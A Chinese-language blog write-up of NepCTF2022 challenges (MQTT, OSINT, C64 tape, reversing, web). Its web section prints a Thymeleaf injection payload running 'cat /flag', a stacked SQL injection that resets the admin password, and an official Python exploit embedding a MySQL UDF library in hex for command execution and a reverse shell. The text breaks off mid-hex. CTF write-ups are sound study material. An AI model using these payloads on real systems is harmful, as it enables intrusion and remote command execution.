@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 官方wp出来之后针对一些题目进行复现，这些题目的思路很值得我们去学习，也具有一定的难度，当时比赛时没有做出来。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【NepCTF2022】赛后复现">
+<meta property="og:url" content="http://example.com/2022/07/19/%E3%80%90NepCTF2022%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 官方wp出来之后针对一些题目进行复现，这些题目的思路很值得我们去学习，也具有一定的难度，当时比赛时没有做出来。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/WCkbeL2nBHAO4Uh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/kSpgF5nOy62hGPL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/19/oVjAY362rUag7SR.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/19/G9EUriDcAFQNjKZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/19/ybdDaTAv3iVzwW5.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/07/19/W4z6UKa7oI12tS8.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/07/19/aiUbWwGjLVAMeNl.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/19/x1ZJSpLUojPKYQI.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/19/dlyNgtD4r82sK9u.png">
+<meta property="article:published_time" content="2022-07-19T06:52:03.000Z">
+<meta property="article:modified_time" content="2022-07-19T14:15:29.718Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/07/18/WCkbeL2nBHAO4Uh.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/07/19/【NepCTF2022】赛后复现/"/>
+
+
+
+
+
+  <title>【NepCTF2022】赛后复现 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/19/%E3%80%90NepCTF2022%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【NepCTF2022】赛后复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-19T14:52:03+08:00">
+                2022-07-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>官方wp出来之后针对一些题目进行复现，这些题目的思路很值得我们去学习，也具有一定的难度，当时比赛时没有做出来。</p>
+</blockquote>
+<span id="more"></span>
+
+<p>官方wp：<a target="_blank" rel="noopener" href="https://www.wolai.com/nepnep/g2DTj6mRtBk2mikVuCyaE6">https://www.wolai.com/nepnep/g2DTj6mRtBk2mikVuCyaE6</a></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="原来你也玩智能家居（赛后）"><a href="#原来你也玩智能家居（赛后）" class="headerlink" title="原来你也玩智能家居（赛后）"></a>原来你也玩智能家居（赛后）</h2><p>很有新意的一题misc。这题是Home Assistant，我们要找到显示器切换的红外数据。</p>
+<p>hint提示要注意开启的应用，看了一下应该是要通过MQTT来进行获取数据，通过订阅连接对物联网设备进行操作。同时由于所有的配置都是默认的，我们去查看下Tasmota有什么默认配置是可以被利用到的：<br><img src="https://s2.loli.net/2022/07/18/WCkbeL2nBHAO4Uh.png"></p>
+<p>我们可以利用这个cmdn，通过MQTT一个通配订阅服就可以获取到数据了：<br><img src="https://s2.loli.net/2022/07/18/kSpgF5nOy62hGPL.png"></p>
+<h2 id="DoubleHappiness"><a href="#DoubleHappiness" class="headerlink" title="DoubleHappiness"></a>DoubleHappiness</h2><p>也是一题osint，这个osint的难度比上一题大了好多。题目给了一张图片，在exif中发现了坐标值：<br><img src="https://s2.loli.net/2022/07/19/oVjAY362rUag7SR.png"></p>
+<p>转换度分秒的GPS坐标为经纬度常用格式(120.1,30.278125)，地点为浙商财富中心。<br><a target="_blank" rel="noopener" href="http://www.minigps.net/fc.html">经纬度转换</a></p>
+<p>那么确定外卖地点后，去找附近的瑞幸咖啡店铺：<br><img src="https://s2.loli.net/2022/07/19/G9EUriDcAFQNjKZ.png"></p>
+<p>确定店家，去美团外卖评论区找，最后发现7月13日有这样一条可疑评论：<br><img src="https://s2.loli.net/2022/07/19/ybdDaTAv3iVzwW5.jpg"></p>
+<p>图片中暴露了微博的名称，我们跟进到微博中，然后在这个人的主页找到了这么一张图：<br><img src="https://s2.loli.net/2022/07/19/W4z6UKa7oI12tS8.jpg"></p>
+<p>看左下角的马赛克部分，隐约可以认出来是flag，那么我们就要去掉这个马赛克。使用unRedacter工具跑，根据描述需要加上大写字母、数字和一些符号，更改下宽高，跑工具跑出flag：<br><img src="https://s2.loli.net/2022/07/19/aiUbWwGjLVAMeNl.png"></p>
+<h2 id="啵哔嘀嘟"><a href="#啵哔嘀嘟" class="headerlink" title="啵哔嘀嘟~"></a>啵哔<del>嘀</del>嘟~</h2><p>打开环境里面是一个流量包，提取其中的7z文件，解压后得到一个wav文件，将其使用如下脚本解码后能得到TAP文件：<br><a target="_blank" rel="noopener" href="https://github.com/Zibri/C64/blob/master/wav2tap2.py">wav2tap2.py</a></p>
+<p>做题的时候直接把这个tap文件拖到ccs64里，然后什么都没有，就不知道接下来该干嘛了。按照wp所说的，接下来使用Final Tap处理看到分段的Program：<br><img src="https://s2.loli.net/2022/07/19/x1ZJSpLUojPKYQI.png"></p>
+<p>然后将其转换回bas文件，使用petcat：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">petcat -o program.bas -- 123.TAP_TURBOTAPE-250\ DATA_BLOCK_6.PRG</span><br></pre></td></tr></table></figure>
+
+<p>得到program.bas：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10 rdothex$right$($ced4) &quot;HELLO NEPCTF, HELLO NEPNEP~&quot;</span><br><span class="line">20 chr$joyinstrjoy 10</span><br><span class="line">30 rdothex$right$($ced4) &quot;TmVwQ1RGezAxNmVmY2Y3LWEwMWEtNDQ0OC05NjdjLWNjYmJkMTUzZGIzYn0=</span><br><span class="line">32 &quot;</span><br></pre></td></tr></table></figure>
+
+<p>解那个base64就是flag了。</p>
+<p>这题的出题思路看得我也是觉得很牛，建议大家也可以去官方wp看看。</p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="快来签到"><a href="#快来签到" class="headerlink" title="快来签到"></a>快来签到</h2><p>难怪这么多人做出来，真的不难，但是我就是没想到。其实我之前有看过KCTF那个叹息之墙，但我做的时候真没想到，好气啊。</p>
+<p>程序拖入IDA64，设置调整图标显示的最大值，然后看main函数的图标模式，哇哦，惊喜来咯：<br><img src="https://s2.loli.net/2022/07/19/dlyNgtD4r82sK9u.png"></p>
+<p>属于是被秀到了。</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h2><p>Thymeleaf模板注入，给了jar附件，反编译后发现在/eval下存在变量lang可控并返回lang。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/eval?h3=__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;cat /flag&quot;).getInputStream()).next()%7d__::.</span><br></pre></td></tr></table></figure>
+
+<h2 id="博学多闻的花花"><a href="#博学多闻的花花" class="headerlink" title="博学多闻的花花"></a>博学多闻的花花</h2><p>在login.php中，登录逻辑是session储存username与studentid的md5值。</p>
+<p>在index.php:183看到了insert，且没有对username进行过滤，这里存在sql注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;insert into score values (NULL, &#x27;&quot;.addslashes_deep($_SESSION[&#x27;username&#x27;]).&quot;&#x27;, $getscroe);</span><br><span class="line">insert into userAnswer values (NULL, &#x27;&quot;.$_SESSION[&#x27;username&#x27;].&quot;&#x27;, &#x27;&quot;.$_POST[&#x27;q1&#x27;].&quot;&#x27;, &#x27;&quot;.$_POST[&#x27;q2&#x27;].&quot;&#x27;, &#x27;&quot;.$_POST[&#x27;q3&#x27;].&quot;&#x27;, &#x27;&quot;.$_POST[&#x27;q4&#x27;].&quot;&#x27;, &#x27;&quot;.$_POST[&#x27;q5&#x27;].&quot;&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>存在multi_query，推断是二次注入+堆叠注入，此处payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;1&#x27;);update users set studentid=&#x27;&#123;passwd&#125;&#x27; where username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>sql语句变化如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...;insert into userAnswer values (NULL, &#x27;a&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;1&#x27;);update users set studentid=&#x27;admin_passwd&#x27; where username=&#x27;admin&#x27;;#&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;, &#x27;1&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这样就更改了admin的studentid，可以登录。</p>
+<p>接下来是udf提权，init.sql文件告诉我们，ctf用户有<code>*.*</code>的file和insert权限，配置文件中的配置均为默认。</p>
+<p>由于服务器是linux-x64，在github选取合适的.so文件或者自己编译，本地使用select获取其hex值。在score.php:54中存在二次注入点，闭合后使用dump file写入so文件，再创造udf，最后执行命令反弹shell。没有权限执行cat命令，寻找有suid位的程序curl，执行<code>curl file:///flag</code>获得flag。</p>
+<p>官方exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot; &quot;</span><br><span class="line"></span><br><span class="line">CMD = &lt;执行的命令&gt;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">COOKIES = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    &quot;Origin&quot;: &quot;&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;&quot;,</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(url, method=&#x27;get&#x27;, cookies=&#123;&#125;, headers=&#123;&#125;, timeout=5, allow_redirects=True, **kwargs):</span><br><span class="line">    # print(url)</span><br><span class="line">    data = kwargs.get(&quot;data&quot;)</span><br><span class="line">    params = kwargs.get(&quot;params&quot;)</span><br><span class="line">    cookies.update(COOKIES)</span><br><span class="line">    headers.update(HEADERS)</span><br><span class="line">    if method == &#x27;get&#x27;:</span><br><span class="line">        resp = session.get(</span><br><span class="line">            url=url,</span><br><span class="line">            data=data,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers,</span><br><span class="line">            cookies=cookies,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            allow_redirects=allow_redirects</span><br><span class="line">        )</span><br><span class="line">    elif method == &#x27;post&#x27;:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            url=url,</span><br><span class="line">            data=data,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers,</span><br><span class="line">            cookies=cookies,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            allow_redirects=allow_redirects</span><br><span class="line">        )</span><br><span class="line">    else:</span><br><span class="line">        session.close()  # close session</span><br><span class="line">        raise Exception(&#x27;Requests method error.&#x27;)</span><br><span class="line">    return resp.content.decode(&#x27;utf8&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getRadmonStr():</span><br><span class="line">    return &#x27;&#x27;.join(random.sample(string.ascii_letters + string.digits, 8))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def reg(sql):</span><br><span class="line">    tarurl = url + &quot;/register.php&quot;</span><br><span class="line">    studentid = getRadmonStr()</span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;username&quot;: sql,</span><br><span class="line">        &quot;studentid&quot;: studentid,</span><br><span class="line">        &quot;submit&quot;: &quot;提交&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    res = req(tarurl, data=params, method=&quot;post&quot;)</span><br><span class="line">    return studentid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(username, studentid):</span><br><span class="line">    tarurl = url + &quot;/login.php&quot;</span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;username&quot;: username,</span><br><span class="line">        &quot;studentid&quot;: studentid,</span><br><span class="line">        &quot;submit&quot;: &quot;提交&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    res = req(tarurl, data=params, method=&quot;post&quot;)</span><br><span class="line">    # print(res)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def logout():</span><br><span class="line">    tarurl = url + &quot;/logout.php&quot;</span><br><span class="line">    res = req(tarurl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def postAns():</span><br><span class="line">    tarurl = url + &quot;/index.php&quot;</span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;q1&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;q2&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;q3&quot;: &quot;4&quot;,</span><br><span class="line">        &quot;q4&quot;: &quot;5&quot;,</span><br><span class="line">        &quot;q5&quot;: &quot;1&quot;,</span><br><span class="line">        # &quot;q6&quot;: &quot;4&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    res = req(tarurl, data=params, method=&quot;post&quot;)</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def posScore(studentid):</span><br><span class="line">    tarurl = url + &quot;/score.php&quot;</span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;studentid&quot;: studentid,</span><br><span class="line">    &#125;</span><br><span class="line">    res = req(tarurl, data=params, method=&quot;post&quot;)</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    passwd = getRadmonStr()</span><br><span class="line">    poc = [</span><br><span class="line">        # 这里可以利用特性直接select获取到admin密码，或者像这样直接修改admin密码</span><br><span class="line">        f&quot;&#123;getRadmonStr()&#125;&#x27;,&#x27;&#123;getRadmonStr()&#125;&#x27;,&#x27;&#123;getRadmonStr()&#125;&#x27;,&#x27;&#123;getRadmonStr()&#125;&#x27;,&#x27;&#123;getRadmonStr()&#125;&#x27;,&#x27;&#123;getRadmonStr()&#125;&#x27;);update users set studentid=&#x27;&#123;passwd&#125;&#x27; where username=&#x27;admin&#x27;;\x23&quot;,</span><br><span class="line">        f&quot;&#123;getRadmonStr()&#125;&#x27;;select 0x7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A